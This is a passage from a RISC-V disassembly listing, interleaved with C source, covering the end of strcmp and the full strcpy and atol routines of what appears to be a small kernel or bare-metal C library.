    80002576:	0ff7f793          	andi	a5,a5,255
    8000257a:	faf70fe3          	beq	a4,a5,80002538 <strcmp+0xe>

  return c1 - c2;
    8000257e:	fef44783          	lbu	a5,-17(s0)
    80002582:	0007871b          	sext.w	a4,a5
    80002586:	fee44783          	lbu	a5,-18(s0)
    8000258a:	2781                	sext.w	a5,a5
    8000258c:	40f707bb          	subw	a5,a4,a5
    80002590:	2781                	sext.w	a5,a5
}
    80002592:	853e                	mv	a0,a5
    80002594:	7422                	ld	s0,40(sp)
    80002596:	6145                	addi	sp,sp,48
    80002598:	8082                	ret

000000008000259a <strcpy>:

char* strcpy(char* dest, const char* src)
{
    8000259a:	7179                	addi	sp,sp,-48
    8000259c:	f422                	sd	s0,40(sp)
    8000259e:	1800                	addi	s0,sp,48
    800025a0:	fca43c23          	sd	a0,-40(s0)
    800025a4:	fcb43823          	sd	a1,-48(s0)
  char* d = dest;
    800025a8:	fd843783          	ld	a5,-40(s0)
    800025ac:	fef43423          	sd	a5,-24(s0)
  while ((*d++ = *src++))
    800025b0:	0001                	nop
    800025b2:	fd043703          	ld	a4,-48(s0)
    800025b6:	00170793          	addi	a5,a4,1
    800025ba:	fcf43823          	sd	a5,-48(s0)
    800025be:	fe843783          	ld	a5,-24(s0)
    800025c2:	00178693          	addi	a3,a5,1
    800025c6:	fed43423          	sd	a3,-24(s0)
    800025ca:	00074703          	lbu	a4,0(a4)
    800025ce:	00e78023          	sb	a4,0(a5)
    800025d2:	0007c783          	lbu	a5,0(a5)
    800025d6:	fff1                	bnez	a5,800025b2 <strcpy+0x18>
    ;
  return dest;
    800025d8:	fd843783          	ld	a5,-40(s0)
}
    800025dc:	853e                	mv	a0,a5
    800025de:	7422                	ld	s0,40(sp)
    800025e0:	6145                	addi	sp,sp,48
    800025e2:	8082                	ret

00000000800025e4 <atol>:

long atol(const char* str)
{
    800025e4:	7179                	addi	sp,sp,-48
    800025e6:	f422                	sd	s0,40(sp)
    800025e8:	1800                	addi	s0,sp,48
    800025ea:	fca43c23          	sd	a0,-40(s0)
  long res = 0;
    800025ee:	fe043423          	sd	zero,-24(s0)
  int sign = 0;
    800025f2:	fe042223          	sw	zero,-28(s0)

  while (*str == ' ')
    800025f6:	a031                	j	80002602 <atol+0x1e>
    str++;
    800025f8:	fd843783          	ld	a5,-40(s0)
    800025fc:	0785                	addi	a5,a5,1
    800025fe:	fcf43c23          	sd	a5,-40(s0)
  while (*str == ' ')
    80002602:	fd843783          	ld	a5,-40(s0)
    80002606:	0007c783          	lbu	a5,0(a5)
    8000260a:	873e                	mv	a4,a5
    8000260c:	02000793          	li	a5,32
    80002610:	fef704e3          	beq	a4,a5,800025f8 <atol+0x14>

  if (*str == '-' || *str == '+') {
    80002614:	fd843783          	ld	a5,-40(s0)
    80002618:	0007c783          	lbu	a5,0(a5)
    8000261c:	873e                	mv	a4,a5
    8000261e:	02d00793          	li	a5,45
    80002622:	00f70b63          	beq	a4,a5,80002638 <atol+0x54>
    80002626:	fd843783          	ld	a5,-40(s0)
    8000262a:	0007c783          	lbu	a5,0(a5)
    8000262e:	873e                	mv	a4,a5
    80002630:	02b00793          	li	a5,43
    80002634:	06f71263          	bne	a4,a5,80002698 <atol+0xb4>
    sign = *str == '-';
    80002638:	fd843783          	ld	a5,-40(s0)
    8000263c:	0007c783          	lbu	a5,0(a5)
    80002640:	0007871b          	sext.w	a4,a5
    80002644:	02d00793          	li	a5,45
    80002648:	40f707b3          	sub	a5,a4,a5
    8000264c:	0017b793          	seqz	a5,a5
    80002650:	0ff7f793          	andi	a5,a5,255
    80002654:	fef42223          	sw	a5,-28(s0)
    str++;
    80002658:	fd843783          	ld	a5,-40(s0)
    8000265c:	0785                	addi	a5,a5,1
    8000265e:	fcf43c23          	sd	a5,-40(s0)
  }

  while (*str) {
    80002662:	a81d                	j	80002698 <atol+0xb4>
    res *= 10;
    80002664:	fe843703          	ld	a4,-24(s0)
    80002668:	87ba                	mv	a5,a4
    8000266a:	078a                	slli	a5,a5,0x2
    8000266c:	97ba                	add	a5,a5,a4
    8000266e:	0786                	slli	a5,a5,0x1
    80002670:	fef43423          	sd	a5,-24(s0)
    res += *str++ - '0';
    80002674:	fd843783          	ld	a5,-40(s0)
    80002678:	00178713          	addi	a4,a5,1
    8000267c:	fce43c23          	sd	a4,-40(s0)
    80002680:	0007c783          	lbu	a5,0(a5)
    80002684:	2781                	sext.w	a5,a5
    80002686:	fd07879b          	addiw	a5,a5,-48
    8000268a:	2781                	sext.w	a5,a5
    8000268c:	873e                	mv	a4,a5
    8000268e:	fe843783          	ld	a5,-24(s0)
    80002692:	97ba                	add	a5,a5,a4
    80002694:	fef43423          	sd	a5,-24(s0)
  while (*str) {
    80002698:	fd843783          	ld	a5,-40(s0)
    8000269c:	0007c783          	lbu	a5,0(a5)
    800026a0:	f3f1                	bnez	a5,80002664 <atol+0x80>
  }

  return sign ? -res : res;
    800026a2:	fe442783          	lw	a5,-28(s0)
    800026a6:	2781                	sext.w	a5,a5
    800026a8:	c791                	beqz	a5,800026b4 <atol+0xd0>
    800026aa:	fe843783          	ld	a5,-24(s0)
    800026ae:	40f007b3          	neg	a5,a5
    800026b2:	a019                	j	800026b8 <atol+0xd4>
    800026b4:	fe843783          	ld	a5,-24(s0)
}
    800026b8:	853e                	mv	a0,a5
    800026ba:	7422                	ld	s0,40(sp)
    800026bc:	6145                	addi	sp,sp,48
    800026be:	8082                	ret
